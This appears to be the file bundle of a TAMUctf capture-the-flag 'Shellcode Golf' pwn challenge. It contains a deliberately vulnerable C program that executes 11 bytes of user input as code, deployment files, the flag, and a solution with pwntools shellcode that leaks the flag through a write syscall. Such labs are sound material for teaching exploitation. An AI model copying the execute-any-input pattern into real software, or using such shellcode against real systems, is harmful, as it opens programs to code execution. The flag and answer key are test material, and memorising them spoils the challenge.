{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{r34lly_71ny_5h3llc0d3_018ed4}\"\n",
    "Dockerfile": "FROM debian as build\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD shellcode-golf.c /tmp/shellcode-golf.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/shellcode-golf /pwn/shellcode-golf\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE 5320\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -s TCP-LISTEN:5320,reuseaddr,fork EXEC:/pwn/shellcode-golf,stderr\"]\n",
    "exploit": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2021-master\\tamuctf-2021-master\\pwn\\shellcode-golf\\exploit]",
    "exploit.s": "BITS 64\nADD rdi, 0\nCMP BYTE [rdi], 255\nJB short 7",
    "flag.txt": "gigem{r34lly_71ny_5h3llc0d3_018ed4}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nCONTAINER := shellcode-golf\n\nall: shellcode-golf\n\nclean: .PHONY\n\trm -f shellcode-golf\n\nshellcode-golf: shellcode-golf.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile shellcode-golf\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name shellcode-golf -p 5320:5320 shellcode-golf\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/shellcode-golf - | tar xv shellcode-golf\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Shellcode Golf\",\n  \"category\": \"Pwn\",\n  \"description\": \"I'll execute any shellcode you give me, but only 11 bytes of it. I bet you can't get the flag!\\n{{url_for('shellcode-golf.c')}}\\n<a href='http://tamuctf.com/static-files/shellcode-golf'>shellcode-golf</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername shellcode-golf -quiet</code>\",\n  \"score\" : 250,\n  \"hints\": [\"32-bit operands have smaller instructions.\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "readme.md": "# shellcode golf\n\nI'll execute any shellcode you give me, but only 11 bytes of it.  I bet you can't get the flag!  \n`nc challenges.tamuctf.com 5320`\n\n(provide binary)\n\n## Solution\n\n```c\nvoid main() {\n\tchar* flag = get_flag();\n\tchar* shellcode = (char*) mmap((void*) 0x1337,12, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\tmprotect(shellcode, 12, PROT_READ | PROT_WRITE | PROT_EXEC);\n\tfgets(shellcode, 12, stdin);\n\t((void (*)(char*))shellcode)(flag);\n}\n```\n\nThe binary has a pointer to the flag on the stack that we need to leak. In fact, a quick look at the registers right before we execute our shellcode shows that the flag is sitting in rdx.\n```text\n$rax   : 0x0000000000010000  \u2192  0x0000000000000a31 (\"1\\n\"?)\n$rbx   : 0x0000555555555260  \u2192  <__libc_csu_init+0> push r15\n$rcx   : 0x000055555555a4e2  \u2192  0x0000000000000000\n$rdx   : 0x0000555555559480  \u2192  \"flag{placeholder}\\n\"\n```\n\nWe won't need to get a shell here, we can just use a write syscall to write flag and read from that. \n\n\n```python\nfrom pwn import *\nimport re\ncontext.arch = 'x86_64'\n\ninitial = asm(r'push %rdx; xchg %ebx,%edx; inc %edx; xchg %eax,%edx; pop %rsi; mov %edi,%eax; syscall')\n\nprint(\"initial payload is\", len(initial), \"bytes\")\n\np = process('./shellcode-golf')\n\np.sendline(initial)\n\nprint(re.search(\"(gigem{.*})\",p.recvall()[:40].decode()).group(1))\n```\n",
    "shellcode-golf.c": "#include <stdlib.h>\n#include <stdio.h>\n#include <sys/mman.h>\n\nchar* get_flag() {\n\tFILE* flag = fopen(\"flag.txt\", \"r\");\n\tchar* buf = malloc(64);\n\tif(flag == NULL) {\n\t\texit(1);\n\t} else {\n\t\tfgets(buf, 64, flag);\n\t}\n\treturn buf;\n\tfflush(0);\n}\n\nvoid main() {\n\tchar* flag = get_flag();\n\tchar* shellcode = (char*) mmap((void*) 0x1337,12, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\tmprotect(shellcode, 12, PROT_READ | PROT_WRITE | PROT_EXEC);\n\tfgets(shellcode, 12, stdin);\n\t((void (*)(char*))shellcode)(flag);\n}",
    "solve.py": "from pwn import *\nimport re\ncontext.arch = 'x86_64'\n\ninitial = asm(r'push %rdx; xchg %ebx,%edx; inc %edx; xchg %eax,%edx; pop %rsi; mov %edi,%eax; syscall')\n\nprint(\"initial payload is\", len(initial), \"bytes\")\n\np = remote('localhost', 4444)\n\np.sendline(initial)\n\nprint(re.search(\"(gigem{.*})\",p.recvall()[:40].decode()).group(1))\n",
    "category": "pwn"
}